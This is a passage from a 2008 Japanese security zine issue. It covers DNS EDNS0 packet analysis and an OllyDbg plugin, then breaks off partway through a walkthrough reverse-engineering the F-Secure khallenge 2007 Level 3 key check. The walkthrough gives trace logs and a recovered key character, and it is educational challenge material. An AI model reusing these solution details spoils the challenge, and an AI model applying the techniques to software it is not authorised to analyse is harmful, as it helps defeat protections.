@@ -1,0 +1,1959 @@
+[-]=======================================================================[-]
+
+                      Wizard Bible vol.40 (2008,4,17)
+
+[-]=======================================================================[-]
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第0章：目次 ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○第0章: DNS拡張EDNS0の解析                                  Kenji Aiko 著
+
+○第1章: OllyWindowPos                                             金床 著
+
+○第2章: リバースエンジニアリング実践 khallengeへのチャレンジ その3-2
+                                                            Green boy 4 著
+
+○第3章: 長者番付における日本社会の闇                            理事長 著
+
+○第4章: はじめてのハッキング　～フォーマットストリング攻撃1～  Defolos 著
+
+○第5章: 基礎暗号学講座・第15回 ～公開鍵暗号の安全性の強弱～   IPUSIRON 著
+
+○第6章: お知らせ
+
+○第7章: 著者プロフィール
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第0章: DNS拡張EDNS0の解析  ---
+
+著者：Kenji Aiko
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　「512バイトの壁」という言葉をご存知だろうか？
+　TCP/IPネットワークにおいて、信頼性と速度はトレードオフの関係にある。あ
+たかも仮想的な空間を構築しているかのように見えるインターネットにおいても、
+リアル世界の物理的距離を無視しているわけではない。日本のコンピュータから
+送信されたデータが、ブラジルのコンピュータに必ずしも届くとは限らない。だ
+からこそ、信頼性を保障するためのTCPである。
+　しかし、インターネットの根幹を支えている技術のひとつであるDNS（Domain
+ Name System）ネットワークは、信頼性を失うことと引き換えに速度を重視した
+UDPにより実現されている。名前解決はインターネットの根幹のひとつであると言
+えるだろう。しかし、その割にはあまり注目度が高くない。
+　今回はそんな、縁の下の力持ちの話である。
+
+
+■0x02.) 512バイトの壁
+
+　「512バイトの壁」とは、名前解決に使用できるパケットサイズの限界値を指す。
+例えばdigコマンドで名前解決を行うと、受け取ったパケットサイズが表示される。
+
+-----  terminal
+# dig @localhost www.example.jp
+
+; <<>> DiG 9.4.0 <<>> @localhost www.example.jp
+; (1 server found)
+;; global options:  printcmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 49259
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;www.example.jp.                        IN      A
+
+;; ANSWER SECTION:
+www.example.jp.         86400   IN      A       192.168.10.6
+
+;; AUTHORITY SECTION:
+example.jp.             86400   IN      NS      dns.example.jp.example.jp.
+
+;; Query time: 0 msec
+;; SERVER: 127.0.0.1#53(127.0.0.1)
+;; WHEN: Sat Apr 19 03:33:15 2008
+;; MSG SIZE  rcvd: 77（←ポイント）
+
+#
+-----
+
+　名前解決により受け取ったパケットサイズは、0x77バイトであることが分かる。
+512バイトに収まっているため、正常に名前解決が出来る。では、もし512バイト
+より大きい名前解決応答が必要になったらどうだろう。以下のファイルを用意す
+る。
+
+-----  example.zone（BIND9用設定ファイル）
+$TTL 86400
+@       IN      SOA     dns.example.jp. root.example.jp. (
+                        2006120101
+                        3600
+                        900
+                        604800
+                        86400
+)
+        IN      NS      dns.example.jp
+dns     IN      A       192.168.10.1
+www     IN      A       192.168.10.100
+www     IN      A       192.168.10.101
+www     IN      A       192.168.10.102
+www     IN      A       192.168.10.103
+www     IN      A       192.168.10.104
+（省略）
+www     IN      A       192.168.10.163
+-----
+
+　www.example.jpに多くのIPアドレスを割り当てた。100から163まで64個のIPア
+ドレスが割り当てられているため、名前解決応答は必ず512バイトを超えるだろう。
+では、digで要求を送り、応答を確認する。
+
+-----  terminal
+# dig @localhost www.example.jp
+;; Truncated, retrying in TCP mode.（←ポイント）
+
+; <<>> DiG 9.4.0 <<>> @localhost www.example.jp
+; (1 server found)
+;; global options:  printcmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 60995
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 64, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;www.example.jp.                        IN      A
+
+;; ANSWER SECTION:
+www.example.jp.         86400   IN      A       192.168.10.100
+www.example.jp.         86400   IN      A       192.168.10.101
+www.example.jp.         86400   IN      A       192.168.10.102
+（省略）
+www.example.jp.         86400   IN      A       192.168.10.163
+
+;; AUTHORITY SECTION:
+example.jp.             86400   IN      NS      dns.example.jp.example.jp.
+
+;; Query time: 2 msec
+;; SERVER: 127.0.0.1#53(127.0.0.1)
+;; WHEN: Sat Apr 19 03:43:26 2008
+;; MSG SIZE  rcvd: 1085（←ポイント）
+
+#
+-----
+
+　512バイトの壁を越えたため、通信がTCPモードになった。
+　この設定ファイルは意図して512バイトを超えるようにしているが、今後IPv6が
+普及し始めると、否応なくこの問題にぶつかることになる。そして、その解決方
+法がTCP。確かに一理あるが、速度が必要だからこそUDPを使っていたDNS。そして、
+今後も「速度が必要である」という事実は変わらない。
+　ここから、現在広く使われ始めている「EDNS0」へと話が進む。
+
+
+■0x03.) EDNS0
+
+　DNSは512バイトを超えない決まりであるが、ネットワークとして512バイト以上
+のパケットは扱えないか？　というと、そうでもない。MTU（Maximum Transmiss
+ion Unit）が1500くらいあるなら、別にDNSでも1500バイトのパケットを扱える。
+問題は、サーバ側とクライアント側の両方に、512バイト以上のMTUが扱えるかど
+うかである。そして、それを解決するのが、EDNS0である。
+　詳しいことは、RFC2671に書かれてある。
+
+RFC2671　DNS用拡張メカニズム (EDNS0)
+http://www.nic.ad.jp/ja/translation/rfc/2671.html
+
+　それなりに長いので読むのが大変だが、要約すると「DNSの要求と応答に『転送
+可能バイト』を格納する」ということだ。クライアントからの要求に入っている
+「転送可能バイト」と、サーバ自身の「転送可能バイト」を比較して小さい方に
+合わせる。現在のネットワークにおいて「転送可能バイト」が512なんてことはほ
+ぼないため、これで安心して512バイト以上のデータを扱える。
+　digコマンドでは、bufsizeオプションを指定することで、EDNS0を扱える。
+
+-----  terminal
+# dig +bufsize=2048 @localhost www.example.jp
+
+; <<>> DiG 9.4.0 <<>> +bufsize=2048 @localhost www.example.jp
+; (1 server found)
+;; global options:  printcmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 40073
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 64, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096（←ポイント）
+;; QUESTION SECTION:
+;www.example.jp.                        IN      A
+
+;; ANSWER SECTION:
+www.example.jp.         86400   IN      A       192.168.10.100
+www.example.jp.         86400   IN      A       192.168.10.101
+www.example.jp.         86400   IN      A       192.168.10.102
+（省略）
+www.example.jp.         86400   IN      A       192.168.10.163
+
+;; AUTHORITY SECTION:
+example.jp.             86400   IN      NS      dns.example.jp.example.jp.
+
+;; Query time: 2 msec
+;; SERVER: 127.0.0.1#53(127.0.0.1)
+;; WHEN: Sat Apr 19 03:59:13 2008
+;; MSG SIZE  rcvd: 1096（←ポイント）
+
+#
+-----
+
+　今度は1096バイトのDNSパケットをUDPで処理した。
+
+
+■0x04.) パケット解析
+
+　512バイトを超えない名前解決の場合は普通のDNSパケットとなる。
+
+-----  terminal
+# dig @55.55.55.56 dns.example.jp
+-----
+
+-----  terminal
+# tcpdump -s 400 -xx -i eth0 udp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 400 bytes
+04:13:33.644091 IP 55.55.55.59.32891 > 55.55.55.56.domain:  30752+ A? dns.example.jp. (32)
+        0x0000:  000e 0c5f 8e6d 0018 8bf7 d083 0800 4500  ..._.m........E.
+        0x0010:  003c 0000 4000 4011 5dd0 3737 373b 3737  .<..@.@.].777;77
+        0x0020:  3738 807b 0035 0028 eb0a 7820 0100 0001  78.{.5.(..x.....
+        0x0030:  0000 0000 0000 0364 6e73 0765 7861 6d70  .......dns.examp
+        0x0040:  6c65 026a 7000 0001 0001                 le.jp.....
+04:13:33.644424 IP 55.55.55.56.domain > 55.55.55.59.32891:  30752* 1/1/0 A 192.168.10.1 (77)
+        0x0000:  0018 8bf7 d083 000e 0c5f 8e6d 0800 4500  ........._.m..E.
+        0x0010:  0069 0000 4000 4011 5da3 3737 3738 3737  .i..@.@.].777877
+        0x0020:  373b 0035 807b 0055 29ac 7820 8580 0001  7;.5.{.U).x.....
+        0x0030:  0001 0001 0000 0364 6e73 0765 7861 6d70  .......dns.examp
+        0x0040:  6c65 026a 7000 0001 0001 c00c 0001 0001  le.jp...........
+        0x0050:  0001 5180 0004 c0a8 0a01 c010 0002 0001  ..Q.............
+        0x0060:  0001 5180 0011 0364 6e73 0765 7861 6d70  ..Q....dns.examp
+        0x0070:  6c65 026a 70c0 10                        le.jp..
+-----
+
+　次に、EDNS0を使用したパケットを確認する。
+
+-----  terminal
+# dig +bufsize=2048 @55.55.55.56 dns.example.jp
+-----
+
+-----  terminal
+# tcpdump -s 400 -xx -i eth0 udp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 400 bytes
+04:17:55.509018 IP 55.55.55.59.32891 > 55.55.55.56.domain:  45014+ [1au] A? dns.example.jp. (43)
+        0x0000:  000e 0c5f 8e6d 0018 8bf7 d083 0800 4500  ..._.m........E.
+        0x0010:  0047 0000 4000 4011 5dc5 3737 373b 3737  .G..@.@.].777;77
+        0x0020:  3738 807b 0035 0033 8a35 afd6 0100 0001  78.{.5.3.5......
+        0x0030:  0000 0000 0001 0364 6e73 0765 7861 6d70  .......dns.examp
+        0x0040:  6c65 026a 7000 0001 0001 0000 2908 0000  le.jp.......)...
+        0x0050:  0000 0000 00                             .....
+04:17:55.509325 IP 55.55.55.56.domain > 55.55.55.59.32891:  45014* 1/1/1 A 192.168.10.1 (88)
+        0x0000:  0018 8bf7 d083 000e 0c5f 8e6d 0800 4500  ........._.m..E.
+        0x0010:  0074 0000 4000 4011 5d98 3737 3738 3737  .t..@.@.].777877
+        0x0020:  373b 0035 807b 0060 e1b5 afd6 8580 0001  7;.5.{.`........
+        0x0030:  0001 0001 0001 0364 6e73 0765 7861 6d70  .......dns.examp
+        0x0040:  6c65 026a 7000 0001 0001 c00c 0001 0001  le.jp...........
+        0x0050:  0001 5180 0004 c0a8 0a01 c010 0002 0001  ..Q.............
+        0x0060:  0001 5180 0011 0364 6e73 0765 7861 6d70  ..Q....dns.examp
+        0x0070:  6c65 026a 70c0 1000 0029 1000 0000 0000  le.jp....)......
+        0x0080:  0000                                     ..
+-----
+
+　通常のパケットと見比べると、要求と応答の両方に、11バイトのデータが付加
+されていることが確認できる。
+
+-----  追加部分（要求）
+        0x0040:  xxxx xxxx xxxx xxxx xxxx 0000 2908 0000
+        0x0050:  0000 0000 00 
+-----
+
+-----  追加部分（応答）
+        0x0070:  xxxx xxxx xxxx xx00 0029 1000 0000 0000
+        0x0080:  0000
+-----
+
+　このデータ列は、DNSのOPT-RRフォーマットに従った作りになっているため、基
+本的にOPT-RRを読み出す方法で読める。ただし、便宜的にフォーマットに従った
+だけであるため、RFCでは「OPT疑似RR」と定義され、「DNSパケットにひとつだけ
+追加できる」とされている。
+　OPT-RRの固定部分の構造を以下に示す。
+
+ フィールド名 | フィールドタイプ     | 説明
+--------------+----------------------+-----------------------------------
+ NAME         | ドメイン名           | ドメイン名（終端'\0'）
+ TYPE         | u_int16_t            | タイプ（'A', 'PTR', 'NS', etc...）
+ CLASS        | u_int16_t            | クラス（'IN', etc...）
+ TTL          | u_int32_t            | TTL（Time To Live）
+ RDLEN        | u_int16_t            | RDATAのサイズ
+ RDATA        | オクテットストリーム | データ
+--------------+----------------------+-----------------------------------
+
+　これらが、OPT疑似RR場合、以下のように設定される。
+
+ フィールド名 | フィールドタイプ     | 説明
+--------------+----------------------+-----------------------------------
+ NAME         | ドメイン名           | '\0'固定
+ TYPE         | u_int16_t            | 0ｘ0029（EDNS0識別番号）
+ CLASS        | u_int16_t            | 転送可能バイト（2048, 4096, etc...）
+ TTL          | u_int32_t            | 0x00000000固定（DNSSEC時にflagが立つ）
+ RDLEN        | u_int16_t            | 0x0000固定
+ RDATA        | オクテットストリーム | RDLENが0x0000固定であるため実質なし
+--------------+----------------------+-----------------------------------
+
+　TTLの部分は1バイトごとに別のステータスが割り当てられているが、現状EDNS
+0を使う場合はすべて0固定である。DNSSECを使用する場合のみフラグが立つ。詳
+細はRFCにて。
+　では、このフォーマットを要求と応答のそれぞれで受け取ったOPT疑似RRで当て
+はめる。
+
+ フィールド名 | 要求                 | 説明
+--------------+----------------------+-----------------------------------
+ NAME         | 0x00                 | '\0'固定
+ TYPE         | 0x0029               | 0ｘ0029（EDNS0識別番号）
+ CLASS        | 0x1000               | 転送可能バイト（2048, 4096, etc...）
+ TTL          | 0x00000000           | 0x00000000固定（DNSSEC時にflagが立つ）
+ RDLEN        | 0x0000               | 0x0000固定
+ RDATA        | なし                 | RDLENが0x0000固定であるため実質なし
+--------------+----------------------+-----------------------------------
+
+ フィールド名 | 応答                 | 説明
+--------------+----------------------+-----------------------------------
+ NAME         | 0x00                 | '\0'固定
+ TYPE         | 0x0029               | 0ｘ0029（EDNS0識別番号）
+ CLASS        | 0x0800               | 転送可能バイト（2048, 4096, etc...）
+ TTL          | 0x00000000           | 0x00000000固定（DNSSEC時にflagが立つ）
+ RDLEN        | 0x0000               | 0x0000固定
+ RDATA        | なし                 | RDLENが0x0000固定であるため実質なし
+--------------+----------------------+-----------------------------------
+
+　目的となる転送可能バイト以外さほどデータを送っていないことがわかる。
+　このようにして、DNSは512バイトの壁をTCPなしで克服する。
+
+
+■0x05.） さいごに
+
+　BIND9では、要求時、まず最初にEDNS0のクエリを出す。つまり、BIND9はすでに
+512バイトの壁の克服に動いているわけだが、必ずしもこのような実装がよいかは
+わからない。なぜなら、EDNS0に対応していないサーバも存在するからだ。もしE
+DNS0にサーバ側が対応していなかった場合、サーバはエラー応答として（NOTIMP
+L, FORMERR, or SERVFAIL）を返す。こうなると、再度、今度は通常のDNS要求を
+出す必要がでてくる。
+　プロトコルの根本的問題は、プロトコルを利用するすべてのソフトウェアが対
+応しなければ意味がない。BIND9だけがEDNS0に対応したとしても、他のソフトが
+対応してくれなければ、結局解決にはならない。しかし、BIND9はもっとも普及し
+ているDNSサーバのひとつだ。そのBIND9が、EDNS0の利用に踏み出したということ
+は、それなりに支持を得た拡張であるのではないかと思う。
+　インターネットの根幹を支えるDNS。たまにはその技術に目を向けてみるのもよ
+いのではないだろうか。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第1章: OllyWindowPos  ---
+
+著者：金床
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　WizardBibleもついに40号を迎えたということで、編集部の方々にはお祝い申し
+上げる。最近は外国人の読者も着実に増えているらしく、外国人が日本語を学ぶ
+動機のトップ3は
+
+1位　ビジネスで使う
+2位　アニメ・漫画を読みたい
+3位　ウィザードバイブルを読みたい
+
+　となっているというｳﾜｻである。
+
+　さてめでたい40号だが、いかんせん育児と仕事の両立で苦しんでいるのでﾈﾀ不
+足である。というか2月と3月働き過ぎてｶﾛｰｼである。ﾊﾗｷﾘ・ｻﾑﾗｲ・ﾌｼﾞﾔﾏ・ｹﾞｲｼｬ
+・ｽｼ・ｶﾛｰｼ。
+　えーと、なんの話だっけ。
+
+
+■0x02.) つぎに
+
+　そうそう、ﾈﾀ不足という話であった。
+　WizardBibleで日本語を勉強している外国人のためにﾗﾃﾝ系紳士の金床が親切丁
+寧に説明するが、「ﾈﾀ」とはｽｼの上部に位置する魚介類を指す。そしてごはん（
+ライス）の部分はｼｬﾘとよぶ。「ﾈﾀ」と「ｼｬﾘ」が渾然一体となってかもしだす優
+雅な味こそがｽｼの真骨頂である。そして「ﾈﾀ不足」というのは「お客さんがいっ
+ぱい来たので今日はもう何も出せません」という店側からのﾒｯｾｰｼﾞだ。
+
+　「ﾈﾀ」は「ｻｼｰﾐ」に似ているが、異なる。これは素人が間違えやすい点なので
+注意したい。「ｻｼｰﾐ」は最初からそれ単体で食べられることを目的に加工された
+食品であり、料理法も異なるのである。「ｽｼ」が出てきたときに「ｻｼｰﾐから先に
+ﾀﾍﾞﾏｽ」などといってﾈﾀだけ食べてはいけないので注意したい。
+　えーと、なんの話だっけ。
+
+
+■0x03.) つづいて
+
+　ということでﾈﾀ不足なので、こんなときのためにﾊｰﾄﾞﾃﾞｨｽｸの奥にしまっておい
+たOllyDbg用のﾌﾟﾗｸﾞｲﾝの「OllyWindowPos」を取り出すことにした。かつて筆者が
+mixiを使っていたころに適当にmixi内で公開したものだ。また最近では筆者のｳｪﾌﾞ
+ｻｲﾄに置いてあるので、知っている人もいるかと思う。
+
+　このﾌﾟﾗｸﾞｲﾝはﾕｰｻﾞｲﾝﾀｰﾌｪｰｽを改善する目的で作ったもので、OllyDbgでたくさ
+ん登場するｳｨﾝﾄﾞｳの大きさや位置を記録・再生するものだ。ﾒｲﾝｳｨﾝﾄﾞｳの位置もコ
+ントロールでき、特にﾃﾞｭｱﾙﾃﾞｨｽﾌﾟﾚｲﾕｰｻﾞにｵｽｽﾒである。なぜならばOllyDbgは起
+動したときに片方のﾃﾞｨｽﾌﾟﾚｲにおさまるようｻｲｽﾞを自ら調整してしまうからだ。
+ﾃﾞｭｱﾙﾃﾞｨｽﾌﾟﾚｲ全体に広がるように各ｳｨﾝﾄﾞｳを配置しても、再起動すると元に戻っ
+てしまうのである。これは筆者にとって非常にｽﾄﾚｽであり、OllyWindowPosという
+ﾌﾟﾗｸﾞｲﾝを作ることになったのだ。
+
+　ﾀﾞｳﾝﾛｰﾄﾞは以下から。
+　http://www.jumperz.net/tools/OllyWindowPos.tar.gz
+
+
+■0x04.） ﾌﾟﾗｸﾞｲﾝの作成方法
+
+　OllyDbgのﾌﾟﾗｸﾞｲﾝはDLLとして作成し、exeと同じﾃﾞｨﾚｸﾄﾘに置くだけで使えるよ
+うになる。詳しくはｸﾗｯｷﾝｸﾞﾊﾞｲﾌﾞﾙのDokoDonさんの記事を読んでいただきたい。
+筆者はこのDokoDonさんの記事のおかげですんなりﾌﾟﾗｸﾞｲﾝの作成に入ることがで
+きた。
+
+
+■0x05.） BCB
+
+　OllyWindowPosはBorland C++ Builder5で作成されている。ﾌﾟﾛｼﾞｪｸﾄﾌｧｲﾙなども
+すべてまとめて置いてあるので、今時BCBを使っているﾏﾆｱがいればそのままﾋﾞﾙﾄﾞ
+することができる。
+
+
+■0x06.） 使い方
+
+　OllyWindowPosをｲﾝｽﾄｰﾙ（DLLをﾃﾞｨﾚｸﾄﾘにｺﾋﾟｰ）してからOllyDbgを起動すると、
+「plugins」ﾒﾆｭｰに「Window Position」ﾒﾆｭｰが追加される。いくつかのｳｨﾝﾄﾞｳを
+好きな位置・好きな大きさにしてから「Save as 1」を選ぶとそのときのポジショ
+ンが「1」として記録される。ｳｨﾝﾄﾞｳの位置をばらばらに変えた後から「Restore
+ 1」を選ぶと先ほど保存したときの状態に戻すことができる。ﾃﾞｰﾀは1から5まで
+用意されているので、好きなﾎﾟｼﾞｼｮﾝを5つまで保存しておくことができる。
+
+
+■0x07.） Sauceｺｰﾄﾞ
+
+　筆者はJava使いなのだがこのﾌﾟﾗｸﾞｲﾝはC++で作成されている。WindowsのAPIを
+直に呼び出すということもあまりやったことがなかったので実に勉強になった。
+見てもらえばわかるように「動けばいいや」的なやっつけ仕事になってしまって
+いるが、これは小さなプログラムということでご勘弁いただきたい。Java使いら
+しく横着にvectorやstring、mapなどを使いまくってみた。
+
+　各ｳｨﾝﾄﾞｳを表示する処理ではﾒﾆｭｰが選択されたように（OllyDbgﾌﾟﾛｾｽに）見せ
+るためにPostMessageを使ってみた。この再引数に当たる数字（2109や2117など）
+はﾘｿｰｽﾊカーというﾂｰﾙでﾊｶｰした記憶がある。
+　また各ﾎﾟｼﾞｼｮﾝはiniﾌｧｲﾙに保存されており、この情報を取り扱う際にはOllyDbg
+がﾌﾟﾗｸﾞｲﾝ向けに提供しているAPIを利用している。
+
+
+■0x08.） おわりに
+
+　今回はﾈﾀとｻｼｰﾐの違いについて詳しく解説した。次回は「日本人の宗教とｶﾛｰｼ」
+についてお話したいと思う。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第2章: リバースエンジニアリング実践 khallengeへのチャレンジ その3-2 ---
+
+著者：Green boy 4
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　Green boy 4です。38号に続き、F-Secure Reverse-Engineering Challenge2007
+(khallenge 2007)の解析を行ないます。今回もLevel3を引き続き解析していきた
+いと思います。2007年にやったものなのに、2008年中に解説し終えられるか若干
+不安になってきましたが、一歩一歩説明していきますので、気長に見ていただけ
+ると幸いです。
+
+　また解析に入る前にお知らせがあります。IDA Proの最新版である5.2ですが、
+機能限定で、Freeの評価版が出ていました。
+
+http://www.hex-rays.com/idapro/idadowndemo.htm
+
+　Freeといっても今回程度の解析であればそれなりに利用可能なので、興味のあ
+る方はダウンロードして試してみるとよいでしょう。では、Level3の解析を再開
+したいと思います。
+
+
+■0x02.) 前回のおさらい
+
+　私の時間がない病により執筆ペースが隔月（というよりクォーターに近い？）
+になっているせいで、おそらく覚えてない方がほとんどだと思うので、軽くおさ
+らいします。Level3はjmp命令を多用した難読化が行なわれていたため、静的解析
+では眺めていても非常にわかりづらかったので、トレースログをとって、jmp命令
+を除いてからリバースエンジニアリングすることにより、1文字目の解読に成功し
+たところまで実施しました。
+
+----- 1文字目を比較しているコード付近のトレースログ（jmp命令省略版）
+004116C8 Main     MOV DWORD PTR DS:[EBX+78],0
+0040F9F0 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+0040F9F6 Main     ADD DWORD PTR DS:[EBX+78],EAX
+004141CB Main     MOV EAX,DWORD PTR DS:[EBX+78]
+004141D1 Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=00162C53 -> 入力文字の１文字目"S"
+004141D3 Main     MOV BYTE PTR DS:[EBX+64],AL
+0040EA55 Main     MOV DWORD PTR DS:[EBX+78],4
+0040F2AB Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+0040F2B1 Main     ADD DWORD PTR DS:[EBX+78],EAX
+0040E43A Main     MOV EAX,DWORD PTR DS:[EBX+78]             ; EAX=00162C28
+0040E440 Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=00162C53 -> 本当のKeyの１文字目"S"
+0040E442 Main     MOV BYTE PTR DS:[EBX+68],AL
+0041288E Main     XOR EAX,EAX                               ; EAX=00000000
+00412890 Main     MOV CL,BYTE PTR DS:[EBX+68]               ; ECX=00162C53
+00412896 Main     CMP BYTE PTR DS:[EBX+64],CL               ; "S"と入力文字を比較している
+0041289C Main     JNZ SHORT FSC_Leve.0041289F
+-----
+
+　現時点で与えている文字列は「S123456789abcdef」です。これで、0041289Cの
+比較はクリアできることになります。また、前回の解析から、以下のことが得ら
+れています。
+
+o 文字数は16文字
+o 正規文字列は「S???????????????」（要はまだ1文字目しかわかっていない）
+o 00162C24に入力値の1文字目、00162C28に本当のKeyの1文字目が読み込まれた
+
+　ではおさらいも済んだので、その後の解析を実施してみます。
+
+
+■0x03.) 2文字目の特定
+
+　現在、0041289CのJNZで停止しています（してない人は、ここにブレークポイン
+トを張って実行後、キーに「S123456789abcdef」を与えてください）。もし、こ
+のチェックルーチンが2文字以降の比較にも使われていれば、再度実行しても、こ
+の場所で停止してくれるはずです。念のためCtrl+F12でトレースしながら結果を
+見てみましょう。すると、ブレークせずに、そのままプログラムが終了してしま
+いました。ということは、1文字目の比較処理は、少なくとも2文字目の比較時に
+は使われていないということになります。最悪のケースは、16文字分全てが別々
+のルーチンで処理される可能性も出てきました。ちょっとめんどくさいことにな
+ってきたかもしれません。と言ってここで挫折しては技術力アップにはつながら
+ないので、根気よく見ていくことにします。では、今取ったトレースログを見て
+いきましょう。
+
+----- 0041289c以降のトレースログ（jmp命令省略版）
+Address  Thread   Command                                   ; Registers and comments
+0041289E Main     INC EAX                                   ; EAX=00000001 -> フラグ？
+0041289F Main     MOV BYTE PTR DS:[EBX+64],AL
+00413EA0 Main     AND BYTE PTR DS:[EBX+64],1
+00413EA7 Main     XOR BYTE PTR DS:[EBX+64],1                ; 1 xor 1 = 0で0クリアしている
+0041148F Main     MOV DWORD PTR DS:[EBX+78],0               ; [EBX+78も0クリア]
+00411FCC Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+00411FD2 Main     ADD DWORD PTR DS:[EBX+78],EAX
+00410B2C Main     MOV AL,BYTE PTR DS:[EBX+64]               ; EAX=00162C00
+00410B32 Main     MOV ECX,DWORD PTR DS:[EBX+78]             ; ECX=00162C24
+00410B38 Main     MOV BYTE PTR DS:[ECX],AL                  ; [00162C24]に0をセット
+0040F964 Main     MOV DWORD PTR DS:[EBX+78],0
+00413154 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+0041315A Main     ADD DWORD PTR DS:[EBX+78],EAX
+004117A0 Main     MOV EAX,DWORD PTR DS:[EBX+78]
+004117A6 Main     MOV EAX,DWORD PTR DS:[EAX]                ; EAX=00000000
+004117A8 Main     MOV DWORD PTR DS:[EBX+64],EAX             ; [EBX+64]に0をセット
+0040E7F3 Main     CMP DWORD PTR DS:[EBX+64],0
+0040E7FD Main     JE SHORT FSC_Leve.0040E804                ; [EBX+64]が0だったらジャンプ
+-----
+
+　ぱっと見た感じ、文字が合っていたかどうかのフラグを立て、それを判定する
+処理に見えます。ただ、自分で入力した文字列がここには出てきていないような
+ので、このあたりを詳しく解析するのは、時間の無駄である可能性があります。
+よって、ここはざっと見ただけで飛ばしました。もし今後、ここの解析を飛ばし
+たことで問題が起こり、先に進めないようなら、その時改めて解析することにし
+ましょう。では次の処理を見てみます。
+
+----- 0041289c以降のトレースログ（jmp命令省略版）
+0040E804 Main     JMP FSC_Leve.0040FD77                     ; 40E7FDの飛び先
+0040FD77 Main     MOV DWORD PTR DS:[EBX+64],1
+00413EB4 Main     MOV DWORD PTR DS:[EBX+78],0
+004127A1 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+004127A7 Main     ADD DWORD PTR DS:[EBX+78],EAX
+004134D8 Main     MOV EAX,DWORD PTR DS:[EBX+64]             ; EAX=00000001
+004134DE Main     MOV ECX,DWORD PTR DS:[EBX+78]
+004134E4 Main     MOV DWORD PTR DS:[ECX],EAX                : 162C24に1を書き込み。文字数？
+004140DA Main     MOV DWORD PTR DS:[EBX+78],0
+00412241 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+00412247 Main     ADD DWORD PTR DS:[EBX+78],EAX
+0040F19E Main     MOV EAX,DWORD PTR DS:[EBX+78]
+0040F1A4 Main     MOV EAX,DWORD PTR DS:[EAX]                ; EAX=00000001 -> 検査対象の文字の位置であり、配列の添え字？（入力文字列がKey[]という配列に入っていたとすると、Key[1]）
+0040F1A6 Main     MOV DWORD PTR DS:[EBX+64],EAX
+00411B02 Main     MOV DWORD PTR DS:[EBX+78],-4
+004133E6 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+004133EC Main     ADD DWORD PTR DS:[EBX+78],EAX
+00412EE6 Main     MOV EAX,DWORD PTR DS:[EBX+78]             ; EAX=00162C20
+00412EEC Main     MOV EAX,DWORD PTR DS:[EAX]                ; EAX=0012FB70 -> 入力した仮文字列の先頭をポイントしているアドレス
+00412EEE Main     MOV DWORD PTR DS:[EBX+68],EAX
